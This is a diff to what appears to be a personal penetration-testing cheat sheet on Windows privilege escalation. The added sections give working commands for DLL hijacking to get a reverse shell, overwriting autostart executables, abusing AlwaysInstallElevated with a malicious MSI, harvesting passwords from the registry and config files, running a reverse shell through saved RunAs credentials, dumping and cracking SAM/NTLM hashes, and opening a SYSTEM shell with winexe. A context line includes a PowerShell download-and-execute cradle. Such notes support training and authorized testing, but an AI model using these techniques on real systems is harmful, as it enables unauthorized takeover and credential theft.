@@ -71,6 +71,7 @@ or just `IEX(New-Object Net.WebClient).DownloadString('URL')`
 
 
 ```
+
 New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"
 
 #copy
@@ -157,7 +158,7 @@ Use accesscheck from sysinternals
 
 `accesschk.exe /accepteula`
 
-Check accessea
+Check access
 
 `.\accesschk.exe /accepteula -uwcqv user c:\`
 
@@ -338,6 +339,140 @@ Now start malicous executable via service `net start filepermsvc`
 
 5. DLL Hijacking
 
+If service-DLL in absolute path is writeable, it can be overwritten with malicious payload.
+
+More common: DLL is missing, so malicious payload can be added into the writable folder to cause havoc.
+
+* Find possible vulnerable service
+
+Use winpeas output to see non-windows services.
+
+Pick some service that can be started and stoped: use accesschk
+`.\accesschk.exe /accepteula -ucqv <user> <service>`
+
+If service can be maunally started and stoped, pick the executable from that service and copy it to other windows machine for analysis
+
+* create service and assign the copied executable to it on the analysis machine (if not existent)
+* start procmon for analysis
+* stop and clear current capture in top panel
+* add filter on process name equal to copied exe `Process Name is `
+* remove network and registry activities
+* start capture
+* start the service
+* identify where is the missing dll `NAME NOT FOUND`
+* create malicious DLL binary and place in writeable directory
+* Enjoy reverse shell
+
+### Autostart exploit
+
+1. Find autostart executables
+
+```powershell
+
+Get-CimInstance -ClassName Win32_StartupCommand |
+  Select-Object -Property Command, Description, User, Location
+
+```
+
+OR via cmd registry
+
+```cmd
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
+
+```
+
+2. Check if they are writeable
+
+```cmd
+accesschk.exe /accepteula -wvu "PATH/to/prog.exe"
+
+icacls <Path>
+#look for (F/M/W) as full access
+
+```
+
+or powershell
+
+```powershell
+
+Get-ChildItem C:\temp\ -Recurse | Get-Acl
+# now look for Everyone
+```
+
+3. Overwrite the original executable and wait for shell at system restart
+
+### Exploiting .msi with AlwaysInstallElevated
+
+1. Detect
+`winpeas.exe  quite windowscreds`
+
+2. If `AlwaysInstallElevated set to 1 in HKLM or HKCU!` then it is exploitable
+
+3. create malicious msi rev shell `-f msi` and execute it on victim
+
+### Passwords compromise
+
+#### Passwords in Registry
+
+Run winpeas
+
+```powershell
+
+winpeas.exe quiet filesinfo userinfo
+
+```
+
+or manually with cmd
+
+```cmd
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+
+#or single registries
+
+reg query "HKLM\Software\...\winlogon"
+
+```
+
+#### RunAs Saved Creds
+
+Discover `winpeas.exe quiet cmd windowscreds`
+
+`cmdkey /list`
+
+Exploit:
+
+`runas /savecred /user:admin C:\PrivEsc\reverse.exe`
+
+#### Search files for information
+
+Look for passwords
+
+`dir /s *pass* == *.config`
+
+If found then search in the directory for strings within files
+
+`findstr /si password *.xml *.ini *.txt`
+
+#### SAM/SYSTEM password hashes
+
+Look for backups in
+
+`c:\Windows\System32\config` or
+
+`c:\Windows\System32\config\RegBack` or use winpeas
+
+`.\winpeas.exe quiet searchfast filesinfo`
+
+* Copy SAM and SYSTEM files to Kali
+
+* For Windows 2k/NT/XP get `samdump2`
+
+* For newer versions use pwdump 
+
+`python /usr/share/creddump7/pwdump.py SYSTEM SAM`
+
+* crack NTLM `hashcat -m 1000 --force hash /wordlist`
 
 ### Kernel Exploits
 
@@ -457,6 +592,15 @@ i686-w64-mingw32-gcc shell.c -o shell.exe
 * add to RDP group
 
 `powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`
+
+## Use winexe 
+
+In kali there is winexe tool that allows running remote commands on windows
+
+```bash
+#to spawn remote cmd SYSTEM shell
+winexe -U 'admin%password123' --system //192.168.1.xxx cmd.exe
+```
 
 # Firewall
 
